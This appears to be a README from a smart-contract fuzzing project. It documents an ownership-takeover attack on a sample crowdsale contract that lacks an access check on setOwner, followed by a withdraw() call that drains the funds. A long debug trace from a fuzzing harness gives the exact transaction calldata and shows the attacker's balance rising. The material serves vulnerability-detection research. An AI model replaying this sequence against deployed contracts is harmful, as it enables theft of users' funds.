# Attack Against the Crowdsale Contract

This attack is exploiting a missing access control bug, which allows any user
to become the owner of the contract. However, a successful attack requires a
couple of conditions that must be satisfied by triggering the right
transactions in the right order.

* One or multiple users call `invest()`, s.t., `raised > goal`
  (i.e., `sload(1) > sload(0)`) 
* Someone calls `setPhase(1)` to transition to `phase == 1`
* The attacker calls `setOwner(attacker)` to change ownership of the contract.
* The attacker calls `withdraw()` to transfer the funds to herself

There is some variability here, as the `setOwner` call can happen anywhere
before the `withdraw()` call. All other transactions must be in the order
above.

## Use with Fuzzing Harness multitx

This attack can be detected in the current `fuzz_multix` fuzzing harness:

```
env DEBUG_PRINT=1 ../build_afuzz/fuzz_multitx ./attack
======================= INFO =========================
This binary is built for afl++.
To run the target function on individual input(s) execute this:
  ../build_afuzz/fuzz_multitx INPUT_FILE1 [INPUT_FILE2 ... ]
To fuzz with afl-fuzz execute this:
  afl-fuzz [afl-flags] -- ../build_afuzz/fuzz_multitx [-N]
afl-fuzz will run N iterations before re-spawning the process (default: 1000)
======================================================
Reading 124 bytes from ./attack
Constructing global state
address: 0xb8ba118a0f49c391ce0fdee0f77119cb009d8971
creator: 0x12e79239d48f83be71dbbd18487f4acc279ee929
tx_sender[] = {
	0x784689c0c5d48cec7275152b3026b53f6f78d03d,
	0x87af1d7e20374a20d4d3914c1a1b0ddfef99cc61,
	0xfe18c3f08417e77b94fb541fed2bf1e09093edd,
	0xddcf2af7ea37d6d9d0a23bdf84c71e8c099d03c2,
	0xecb803ea8bc30894cc4672a9159ca000d377d9a3,
}
with initial funds: 0x1000000000000000000000000000000000000000000000000
running fuzzcase

transaction 0
found input length: 4 and actual remaining bytes 4
Running Transaction 0
input bytes: 0xe8b5e51f
4byte sig: 0xe8b5e51f
call value: 0x21e19e0c9bb00000000
from: 0x784689c0c5d48cec7275152b3026b53f6f78d03d
Running specialized code
EVM Code done
return code: 1
Exception:
last PC: 0
74 (1): DUP1
stack before:
 0: 0xe8b5e51f

321 (1): JUMPDEST
stack before:
 0: 0xe8b5e51f

831 (1): JUMPDEST
stack before:
 0: 0x149
 1: 0xe8b5e51f

844 (1): POP
stack before:
 0: 0x1
 1: 0x149
 2: 0xe8b5e51f

852 (1): JUMPDEST
stack before:
 0: 0x1
 1: 0x149
 2: 0xe8b5e51f

861 (1): JUMPDEST
stack before:
 0: 0x149
 1: 0xe8b5e51f

329 (1): JUMPDEST
stack before:
 0: 0xe8b5e51f

no response

transaction 1
found input length: 36 and actual remaining bytes 36
Running Transaction 1
input bytes: 0x2cc826550000000000000000000000000000000000000000000000000000000000000001
4byte sig: 0x2cc82655
call value: 0x0
from: 0x784689c0c5d48cec7275152b3026b53f6f78d03d
Running specialized code
EVM Code done
return code: 1
Exception:
last PC: 0
206 (1): JUMPDEST
stack before:
 0: 0x20
 1: 0x4
 2: 0xe4
 3: 0x2cc82655

399 (1): JUMPDEST
stack before:
 0: 0x1
 1: 0xe4
 2: 0x2cc82655

410 (1): POP
stack before:
 0: 0x1
 1: 0x1
 2: 0xe4
 3: 0x2cc82655

419 (1): JUMPDEST
stack before:
 0: 0x1
 1: 0x1
 2: 0xe4
 3: 0x2cc82655

459 (1): JUMPDEST
stack before:
 0: 0x1
 1: 0x1
 2: 0xe4
 3: 0x2cc82655

468 (1): JUMPDEST
stack before:
 0: 0x1
 1: 0xe4
 2: 0x2cc82655

228 (1): JUMPDEST
stack before:
 0: 0x2cc82655

no response

transaction 2
found input length: 36 and actual remaining bytes 36
Running Transaction 2
input bytes: 0x13af403500000000000000000000000087af1d7e20374a20d4d3914c1a1b0ddfef99cc61
4byte sig: 0x13af4035
call value: 0x0
from: 0x87af1d7e20374a20d4d3914c1a1b0ddfef99cc61
Running specialized code
EVM Code done
return code: 1
Exception:
last PC: 0
0 (1): PUSH1
stack before:

13 (1): PUSH1
stack before:

90 (1): JUMPDEST
stack before:
 0: 0x13af4035

102 (1): JUMPDEST
stack before:
 0: 0x0
 1: 0x13af4035

125 (1): JUMPDEST
stack before:
 0: 0x20
 1: 0x4
 2: 0xa9
 3: 0x13af4035

331 (1): JUMPDEST
stack before:
 0: 0x87af1d7e20374a20d4d3914c1a1b0ddfef99cc61
 1: 0xa9
 2: 0x13af4035

169 (1): JUMPDEST
stack before:
 0: 0x13af4035

no response

transaction 3
found input length: 4 and actual remaining bytes 4
Running Transaction 3
input bytes: 0x3ccfd60b
4byte sig: 0x3ccfd60b
call value: 0x0
from: 0x87af1d7e20374a20d4d3914c1a1b0ddfef99cc61
Running specialized code
EVM Code done
return code: 1
Exception:
last PC: 0
41 (1): DUP1
stack before:
 0: 0x3ccfd60b

230 (1): JUMPDEST
stack before:
 0: 0x3ccfd60b

242 (1): JUMPDEST
stack before:
 0: 0x0
 1: 0x3ccfd60b

478 (1): JUMPDEST
stack before:
 0: 0xfb
 1: 0x3ccfd60b

493 (1): JUMPDEST
stack before:
 0: 0xfb
 1: 0x3ccfd60b

599 (1): JUMPDEST
stack before:
 0: 0x0
 1: 0xfb
 2: 0x3ccfd60b

251 (1): JUMPDEST
stack before:
 0: 0x3ccfd60b

no response

[DONE] all transactions executed
contract: 0xb8ba118a0f49c391ce0fdee0f77119cb009d8971
balance = 0x0
more than initial balance? no
contract creator: 0x12e79239d48f83be71dbbd18487f4acc279ee929
balance = 0x1000000000000000000000000000000000000000000000000
more than initial balance? no
checking balance of 0x784689c0c5d48cec7275152b3026b53f6f78d03d
= 0xfffffffffffffffffffffffffffffde1e61f364500000000
checking balance of 0x87af1d7e20374a20d4d3914c1a1b0ddfef99cc61
= 0x10000000000000000000000000000021e19e0c9bb00000000
account 0x87af1d7e20374a20d4d3914c1a1b0ddfef99cc61 has balance 0x10000000000000000000000000000021e19e0c9bb00000000( > 0x1000000000000000000000000000000000000000000000000)
[1]    82466 abort (core dumped)  env DEBUG_PRINT=1 ../build_afuzz/fuzz_multitx ./attack
```
